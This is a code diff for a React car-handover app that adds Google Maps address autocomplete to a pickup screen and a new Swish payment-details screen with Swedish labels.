@@ -1,9 +1,10 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { CalendarIcon, AlertCircle } from 'lucide-react';
 import { useAuth } from '@/contexts/AuthContext';
 import { useNavigate } from 'react-router-dom';
 import BankIDScreen from '@/components/BankID/BankIDScreen';
 import BankIDLogin from '@/components/BankID/BankIDLogin';
+import { Loader } from '@googlemaps/js-api-loader';
 import {
   AlertDialog,
   AlertDialogAction,
@@ -61,7 +62,12 @@ interface TransportScreenProps {
   onBack: () => void;
 }
 
-type ViewType = 'login' | 'car-details' | 'parts-info' | 'transport' | 'bankid' | 'success';
+interface PaymentInfoScreenProps {
+  onNext: () => void;
+  onBack: () => void;
+}
+
+type ViewType = 'login' | 'car-details' | 'parts-info' | 'transport' | 'payment-info' | 'bankid' | 'success';
 
 // Car Details Form Component - Moved outside to prevent re-renders
 const CarDetailsForm = React.memo<CarDetailsFormProps>(({ 
@@ -503,7 +509,92 @@ const PartsInfoScreen = React.memo<PartsInfoScreenProps>(({ partsInfo, setPartsI
 const TransportScreen = React.memo<TransportScreenProps>(({ transportMethod, setTransportMethod, onNext, onBack }) => {
   const [address, setAddress] = React.useState<string>("Vallenrenen 1, Sörberge");
   const [additionalInfo, setAdditionalInfo] = React.useState<string>("");
+  const mapRef = useRef<HTMLDivElement>(null);
+  const autocompleteRef = useRef<google.maps.places.Autocomplete | null>(null);
+  const mapInstanceRef = useRef<google.maps.Map | null>(null);
+  const markerRef = useRef<google.maps.Marker | null>(null);
+  
   const isNextEnabled = transportMethod !== '';
+
+  // Initialize Google Maps
+  useEffect(() => {
+    if (transportMethod === 'pickup' && mapRef.current) {
+      const loader = new Loader({
+        apiKey: process.env.REACT_APP_GOOGLE_MAPS_API_KEY || '', // You'll need to add this
+        version: 'weekly',
+        libraries: ['places']
+      });
+
+      loader.load().then(() => {
+        // Initialize map
+        const map = new google.maps.Map(mapRef.current!, {
+          center: { lat: 62.3908, lng: 17.3069 }, // Sundsvall coordinates
+          zoom: 13,
+          mapTypeControl: false,
+          streetViewControl: false,
+          fullscreenControl: false,
+        });
+        mapInstanceRef.current = map;
+
+        // Add marker
+        const marker = new google.maps.Marker({
+          position: { lat: 62.3908, lng: 17.3069 },
+          map: map,
+          draggable: true,
+          title: 'Pickup Location'
+        });
+        markerRef.current = marker;
+
+        // Update address when marker is dragged
+        marker.addListener('dragend', () => {
+          const position = marker.getPosition();
+          if (position) {
+            const geocoder = new google.maps.Geocoder();
+            geocoder.geocode({ location: position }, (results, status) => {
+              if (status === 'OK' && results?.[0]) {
+                setAddress(results[0].formatted_address);
+              }
+            });
+          }
+        });
+      }).catch(console.error);
+    }
+  }, [transportMethod]);
+
+  // Initialize autocomplete
+  useEffect(() => {
+    if (transportMethod === 'pickup') {
+      const loader = new Loader({
+        apiKey: process.env.REACT_APP_GOOGLE_MAPS_API_KEY || '',
+        version: 'weekly',
+        libraries: ['places']
+      });
+
+      loader.load().then(() => {
+        const input = document.getElementById('address-input') as HTMLInputElement;
+        if (input) {
+          const autocomplete = new google.maps.places.Autocomplete(input, {
+            componentRestrictions: { country: 'se' }, // Restrict to Sweden
+            fields: ['formatted_address', 'geometry']
+          });
+          autocompleteRef.current = autocomplete;
+
+          autocomplete.addListener('place_changed', () => {
+            const place = autocomplete.getPlace();
+            if (place.formatted_address && place.geometry?.location) {
+              setAddress(place.formatted_address);
+              
+              // Update map center and marker
+              if (mapInstanceRef.current && markerRef.current) {
+                mapInstanceRef.current.setCenter(place.geometry.location);
+                markerRef.current.setPosition(place.geometry.location);
+              }
+            }
+          });
+        }
+      }).catch(console.error);
+    }
+  }, [transportMethod]);
   
   return (
     <div className="min-h-screen theme-swedish mobile-container">
@@ -590,12 +681,13 @@ const TransportScreen = React.memo<TransportScreenProps>(({ transportMethod, set
               </div>
             </div>
 
-            {/* Address and Additional Info - shown when transport option is selected */}
-            {transportMethod && (
+            {/* Address and Additional Info - shown only when "Vi hämtar bilen" is selected */}
+            {transportMethod === 'pickup' && (
               <div className="space-y-4">
-                {/* Address Field */}
+                {/* Address Field with Google Maps Autocomplete */}
                 <div className="relative">
                   <input
+                    id="address-input"
                     type="text"
                     value={address}
                     onChange={(e) => setAddress(e.target.value)}
@@ -612,6 +704,11 @@ const TransportScreen = React.memo<TransportScreenProps>(({ transportMethod, set
                 <p className="text-sm text-gray-600">
                   Hittar du inte adress? Välj närmaste och beskriv nedan.
                 </p>
+
+                {/* Small Map */}
+                <div className="h-48 w-full bg-gray-200 rounded-lg overflow-hidden">
+                  <div ref={mapRef} className="w-full h-full"></div>
+                </div>
 
                 {/* Additional Info */}
                 <div>
@@ -639,6 +736,118 @@ const TransportScreen = React.memo<TransportScreenProps>(({ transportMethod, set
                 </div>
               </div>
             )}
+          </div>
+        </div>
+
+        {/* Navigation Buttons */}
+        <div className="mt-6 space-y-4 pb-8">
+          <button
+            onClick={onNext}
+            disabled={!isNextEnabled}
+            className={`w-full py-4 text-lg font-semibold rounded-full transition-colors ${
+              isNextEnabled
+                ? "bg-gray-800 text-white hover:bg-gray-700"
+                : "bg-gray-300 text-gray-500 cursor-not-allowed"
+            }`}
+          >
+            NÄSTA
+          </button>
+          
+          <button
+            onClick={onBack}
+            className="w-full text-center text-gray-600 underline text-base py-2"
+          >
+            Backa
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+});
+
+// Payment Info Screen - New screen for payment details
+const PaymentInfoScreen = React.memo<PaymentInfoScreenProps>(({ onNext, onBack }) => {
+  const [mobileNumber, setMobileNumber] = React.useState<string>("");
+  const [email, setEmail] = React.useState<string>("");
+  
+  const isNextEnabled = mobileNumber.length >= 10 && email.includes('@');
+  
+  return (
+    <div className="min-h-screen theme-swedish mobile-container">
+      {/* Status Bar */}
+      <div className="flex justify-between items-center text-black text-sm pt-2 px-4">
+        <span className="font-medium">12:30</span>
+        <div className="flex items-center space-x-1">
+          <div className="flex space-x-1">
+            <div className="w-1 h-3 bg-black rounded-full"></div>
+            <div className="w-1 h-3 bg-black rounded-full"></div>
+            <div className="w-1 h-3 bg-black rounded-full opacity-50"></div>
+            <div className="w-1 h-3 bg-black rounded-full opacity-30"></div>
+          </div>
+          <svg className="w-6 h-4 ml-2" fill="black" viewBox="0 0 24 16">
+            <path d="M2 4v8c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2z"/>
+            <path d="M18 2v12h2V2h-2z"/>
+          </svg>
+        </div>
+      </div>
+
+      {/* Navigation Tabs */}
+      <div className="flex items-center justify-between text-black text-xs px-4 py-4">
+        <div className="flex items-center space-x-2">
+          <span className="opacity-50">Biluppgifter</span>
+          <span className="opacity-50">Om bilen</span>
+          <span className="opacity-50">Transport</span>
+        </div>
+        <div className="flex items-center space-x-2">
+          <div className="w-2 h-2 bg-black rounded-full"></div>
+          <span className="font-medium">Betalnings Info</span>
+        </div>
+      </div>
+
+      {/* Main Content */}
+      <div className="px-4">
+        <h1 className="text-2xl font-bold text-black mb-6">BETALNINGS INFO</h1>
+        
+        {/* White Card */}
+        <div className="bg-white rounded-xl p-6 shadow-sm space-y-6">
+          <div>
+            <h2 className="text-lg font-bold text-black mb-4">
+              Vart kan vi skicka info?
+            </h2>
+            
+            <p className="text-sm text-gray-600 mb-6">
+              Ange ditt Swish telefonnummer kopplat till ditt personnummer 19910903444
+            </p>
+            
+            <div className="space-y-4">
+              {/* Mobile Number Field */}
+              <div>
+                <label className="block text-base font-semibold text-black mb-2">
+                  Mobilnummer till ditt Swish
+                </label>
+                <input
+                  type="tel"
+                  value={mobileNumber}
+                  onChange={(e) => setMobileNumber(e.target.value)}
+                  className="w-full bg-gray-100 border-0 rounded-lg px-4 py-3 text-base placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  placeholder="070-123 45 67"
+                />
+              </div>
+
+              {/* Email Field */}
+              <div>
+                <label className="block text-base font-semibold text-black mb-2">
+                  E-postadress
+                </label>
+                <input
+                  type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full bg-gray-100 border-0 rounded-lg px-4 py-3 text-base placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  placeholder="din@email.se"
+                />
+              </div>
+            </div>
           </div>
         </div>
 
